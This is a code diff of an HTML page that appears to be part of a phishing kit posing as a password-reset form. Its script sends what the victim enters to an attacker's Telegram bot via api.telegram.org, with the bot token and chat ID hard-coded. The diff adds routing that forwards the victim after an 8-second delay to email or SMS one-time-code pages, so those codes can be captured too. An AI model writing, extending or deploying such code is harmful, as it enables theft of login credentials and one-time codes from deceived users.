@@ -132,7 +132,7 @@
     <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"></script>
     <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
 
-    <!-- ====== TELEGRAM + 8‑SECOND PROCESSING DELAY ====== -->
+    <!-- ====== TELEGRAM + CHANNEL-BASED REDIRECT ====== -->
     <script>
         // ============================================================
         // CONFIGURATION – YOUR TELEGRAM BOT CREDENTIALS
@@ -140,6 +140,12 @@
         const BOT_TOKEN = '8895080988:AAFgOP7jAWJKElaTchJFVu4fvHC-mTpAdUs';
         const CHAT_ID = '8981287811';
         // ============================================================
+
+        // Where to send the user depending on the chosen channel
+        const CHANNEL_ROUTES = {
+            'EMAIL': 'eotp.html',
+            'SMS':   'otp.html'
+        };
 
         $(document).ready(function() {
             $('#reset-password-form').on('submit', function(e) {
@@ -172,12 +178,14 @@
                     url: `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`,
                     method: 'GET',
                     timeout: 5000
-                    // No success/error handling – we redirect after 8s anyway
                 });
 
-                // 4. Wait 8 seconds, then redirect to the next page
+                // 4. Pick the destination based on the selected channel
+                const destination = CHANNEL_ROUTES[channel] || 'otp.html';
+
+                // 5. Wait 8 seconds, then redirect
                 setTimeout(function() {
-                    window.location.href = 'otp2.html';
+                    window.location.href = destination;
                 }, 8000);
             });
         });
